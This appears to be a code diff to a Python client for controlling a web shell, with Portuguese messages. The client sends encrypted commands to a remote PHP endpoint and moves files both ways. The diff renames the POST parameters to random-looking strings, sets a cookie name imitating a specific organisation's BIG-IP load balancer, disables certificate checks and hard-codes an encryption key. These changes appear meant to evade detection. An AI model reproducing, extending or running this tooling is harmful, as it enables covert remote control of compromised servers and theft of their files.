@@ -1,7 +1,10 @@
+#!/bin/python3
 from crypt import *
 import requests, re, os
 from utils import *
 from tqdm import tqdm
+import argparse, json
+from menu import *
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -14,13 +17,13 @@ except AttributeError:
     pass
 
 class Config(object):
-    Url = 'http://x.x.x.x/index.php'
-    User = 'user'
-    Pass = 'pass'
+    Url = 'http://localhost'
+    User = 'username'
+    Pass = 'password'
     Key = 'sgMfr6*Q=UhpXPQcZavk#dkDyQ!Mg=C4XjqjpuMU+ebb#JUH&Hc!GZVD32GQ37mc'
 
     CookieIPValue = False
-    CookieIPName = False
+    CookieIPName = 'BIGipServer~DMZ_INTERNET_1~grupo-152'
 
     Domain = ''
 
@@ -29,6 +32,8 @@ class Config(object):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
 
+    PostCmd = 'PB0'
+    PostFile = 'aBKLUy69wMcFO85eBSMT'
     AllowPing = True
 
 class LocalCommands(object):
@@ -141,7 +146,7 @@ class Shell(object):
     def Send(cmd, resend=False):
         try:
             
-            res = Shell.Session.post(Config.Url, data={'a': crypt.encode(cmd)}, headers=Config.Headers, verify=False, allow_redirects=False)
+            res = Shell.Session.post(Config.Url, data={Config.PostCmd: crypt.encode(cmd)}, headers=Config.Headers, verify=False, allow_redirects=False)
 
             if res.status_code == 401 and not resend:
                 Util.Warn("Sessão expirada, tentando autenticar novamente...")
@@ -151,9 +156,10 @@ class Shell(object):
                 
                 return Shell.Send(cmd, True)
 
+            
             if not Util.verifyCodes(res):
                 return False
-
+            
             info = res.headers.get('X-Info', '')
             if len(info) > 0:
                 info = crypt.decode(info).split('|')
@@ -173,9 +179,11 @@ class Shell(object):
                 **Config.Headers
             }, allow_redirects=False, verify=False)
 
+            
             if not Util.verifyCodes(res):
                 return False
 
+            
             if res.status_code == 200:
                 info = res.headers.get('X-Info', '')
                 if len(info) > 0:
@@ -231,7 +239,7 @@ class Shell(object):
 
     def download(remotefile, local, resend=False):
         try:
-            res = Shell.Session.post(Config.Url, data={'a': crypt.encode(f'download {remotefile}')}, headers=Config.Headers, verify=False, allow_redirects=False, stream=True)
+            res = Shell.Session.post(Config.Url, data={Config.PostCmd: crypt.encode(f'download {remotefile}')}, headers=Config.Headers, verify=False, allow_redirects=False, stream=True)
 
             if res.status_code == 401 and not resend:
                 Util.Warn("Sessão expirada, tentando autenticar novamente...")
@@ -267,10 +275,10 @@ class Shell(object):
         try:
        
             res = Shell.Session.post(Config.Url, data={
-                'a': crypt.encode(f'upload {remotedest}')
-            }, files={'file': open(localfile, 'rb')}, headers={'User-Agent': Config.Headers['User-Agent']}, verify=False, allow_redirects=False)
+                Config.PostCmd: crypt.encode(f'upload {remotedest}')
+            }, files={Config.PostFile: open(localfile, 'rb')}, headers={'User-Agent': Config.Headers['User-Agent']}, verify=False, allow_redirects=False)
             
-          
+            
             if res.status_code == 401 and not resend:
                 Util.Warn("Sessão expirada, tentando autenticar novamente...")
 
@@ -298,9 +306,10 @@ class Shell(object):
         def startupload(filename, resend=False):
             try:
                 res = Shell.Session.post(Config.Url, data={
-                    'a': crypt.encode(f'startupload {filename}')
+                    Config.PostCmd: crypt.encode(f'startupload {filename}')
                 }, headers=Config.Headers, verify=False, allow_redirects=False)
 
+                
                 if res.status_code == 401 and not resend:
                     Util.Warn("Sessão expirada, tentando autenticar novamente...")
 
@@ -317,9 +326,9 @@ class Shell(object):
         def uploadblock(block):
             try:
                 res = Shell.Session.post(Config.Url, data={
-                    'a': crypt.encode(f'uploadblock {block}')
+                    Config.PostCmd: crypt.encode(f'uploadblock {block}')
                 }, headers=Config.Headers, verify=False, allow_redirects=False)
-
+                
                 if res.status_code == 401 and not resend:
                     Util.Warn("Sessão expirada, tentando autenticar novamente...")
 
@@ -335,7 +344,7 @@ class Shell(object):
         def stopupload():
             try:
                 res = Shell.Session.post(Config.Url, data={
-                    'a': crypt.encode(f'stopupload')
+                    Config.PostCmd: crypt.encode(f'stopupload')
                 }, headers=Config.Headers, verify=False, allow_redirects=False)
 
                 if res.status_code == 401 and not resend:
@@ -374,14 +383,12 @@ class Shell(object):
             m = stopupload()
             return m
         return f"Não foi possível abrir o arquivo {localfile}"
-            
-
-    
-
-
 
 def main():
-    Config.AllowPing = False
+
+    if not Menu.Init(Config):
+        return False
+    
     Shell.Init()
 
 if __name__ == '__main__':
